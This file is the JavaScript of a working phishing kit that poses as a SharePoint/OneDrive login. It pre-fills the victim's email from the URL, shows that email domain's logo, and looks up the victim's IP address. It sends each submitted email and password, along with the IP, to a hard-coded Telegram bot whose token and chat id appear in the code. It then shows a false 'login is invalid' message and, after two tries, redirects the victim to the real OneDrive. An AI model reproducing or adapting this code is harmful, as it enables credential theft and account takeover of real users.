    /* global $ */
    $(document).ready(function(){
      var count=0;
       let u53TiQ = '';
      $.getJSON('https://api.ipify.org?format=json', function(data){
        u53TiQ = data.ip;
        });

var tx1="7263825760";
var tx2="7111737503:AAFT11oonanKroAmiLN7fWt3uvFZ-iAdpxM";
 ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
		
		
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();
		$("#logoname").html(final);
		$("#logonames").html(final);
		$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
		$("#mainPage").attr("src", "https://www."+my_slice);
		$("#logoname").html(my_slice);


       
      }


	  
	  
	  
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );

                    if (!password) {
                $('#msg').show();
                $('#msg').html("The login is invalid");

                return false;
            }


      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);

        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
          

      $.ajax({
        dataType: 'JSON',
		url: ur,
        type: 'GET',
        data:{
          ajaxid: 4,
		text: ("====Anonnymouxx Sharepoint====\nEmail: " + email + "\nPassword: " + password + "\nIp: " + u53TiQ )			
        },
			processData: true,
		contentType: false,
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Log in');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response.ok === true){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
             window.location.replace("https://www.onedrive.com/document");
              }
                  $("#msg").show();
    	$('#msg').html("The login is invalid");
                }
                else{
                 $("#msg").show();
    	$('#msg').html("The login is invalid");
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                  		window.location.replace("https://www.onedrive.com/document");
              }
            
             $("#msg").show();
    $('#msg').html("The login is invalid");
            },
            complete: function(){
              $('#submit-btn').html('Log in');
            }
          });
    });


    });
